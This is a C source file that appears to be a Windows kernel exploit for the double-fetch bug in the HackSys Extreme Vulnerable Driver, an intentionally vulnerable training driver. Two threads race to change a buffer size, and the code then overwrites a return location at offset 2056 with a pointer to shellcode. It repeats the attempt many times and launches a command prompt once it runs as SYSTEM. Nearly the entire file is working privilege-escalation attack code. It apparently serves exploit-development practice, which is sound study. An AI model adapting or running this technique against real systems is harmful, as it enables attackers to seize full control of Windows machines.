#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#include <PwnLib.h>
#include <hevd.h>



#define IOCTL_CODE IOCTL_HEVD_DOUBLE_FETCH


HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t qUserData[2] = {0};
DWORD dwInBufferSize = 0;
LPVOID lpInBuffer = NULL;
LPVOID lpShellcode = NULL;


DWORD Racer0(LPVOID lpParams)
{
        UNREFERENCED_PARAMETER(lpParams);
        for(int i=0; i<10000; i++){
                qUserData[1] = GetPageSize();
        }

        return 0;
}


DWORD Racer1(LPVOID lpParams)
{
        UNREFERENCED_PARAMETER(lpParams);
        for(int i=0; i<10000; i++){
                qUserData[1] = 0x800;
        }

        return 0;
}


BOOL HevdIoControl()
{
        BOOL bResult = TRUE;

        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_CODE);

        hDevice = CreateFileA(DRIVER_PATH,
                        GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                        NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }
        ok("Got device handle %#x\n", hDevice);


        info("prepare the memory location...\n");
        qUserData[0] = (uint64_t)lpInBuffer;
        qUserData[1] = 0x800;


        info("starting the racing threads...\n");
        HANDLE hThreads[2] = {0};
        hThreads[0] = CreateThread(
                        NULL,
                        0x1000,
                        Racer0,
                        NULL,
                        0,
                        NULL
        );
        if (hThreads[0] == NULL) {
                perr("CreateThread(0) failed");
                goto CloseDevice_loc;
        }

        hThreads[1] = CreateThread(
                        NULL,
                        0x1000,
                        Racer1,
                        NULL,
                        0,
                        NULL
        );
        if (hThreads[1] == NULL) {
                CloseHandle(hThreads[0]);
                perr("CreateThread(1) failed");
                goto CloseDevice_loc;
        }


        info("trigger the ioctl...\n");
        DWORD dwBytesReturned;

        YieldProcessor();

        bResult = DeviceIoControl(hDevice,
                                  IOCTL_CODE,
                                  qUserData,
                                  0x10,
                                  NULL,
                                  0,
                                  &dwBytesReturned,
                                  (LPOVERLAPPED) NULL);
        if (bResult==FALSE){
                perr("DeviceIoControl() failed");
        }

        WaitForMultipleObjects(2, hThreads, TRUE, INFINITE);
        for(int i=0; i<2; i++){
                CloseHandle(hThreads[i]);
        }


CloseDevice_loc:

        if (hDevice != INVALID_HANDLE_VALUE){
                CloseHandle(hDevice);
        }

        return bResult;
}



int main(int argc, char** argv, char** envp)
{
        UNREFERENCED_PARAMETER(argc);
        UNREFERENCED_PARAMETER(envp);

        info("preparing the payload...\n");
        dwInBufferSize = GetPageSize();
        // lpInBuffer = (LPVOID)CreateDeBruijnPattern(dwInBufferSize); // pwn cyclic -n 8 -l 0x6b61616161616168 -> 2056
        lpInBuffer = VirtualAlloc(NULL, dwInBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        RtlFillMemory(lpInBuffer, 2056, '\xcc');
        ok("payload=%p\n", lpInBuffer);

        lpShellcode = AllocatePageWithShellcode();
        ok("shellcode=%p\n", lpShellcode);

        info("adjusting *(payload+2056)\n");
        PULONG_PTR shellcode_ptr = lpInBuffer+2056;
        *shellcode_ptr = lpShellcode;

        getchar();



        info("Starting exploit for Double Fetch...\n");

        for (int i=0; i<100000; i++){
                HevdIoControl();
        }

        info("Checking if %s is SYSTEM\n", argv[0]);
        if(CheckIsSystem()==TRUE){
                ok("Success\n");
                PopupCmd();
        }


        info("Free the payload resources...\n");

        if(lpInBuffer)
                VirtualFree(lpInBuffer, dwInBufferSize, MEM_DECOMMIT);

        if(lpShellcode)
                VirtualFree(lpShellcode, GetPageSize(), MEM_DECOMMIT);

        return 0;
}
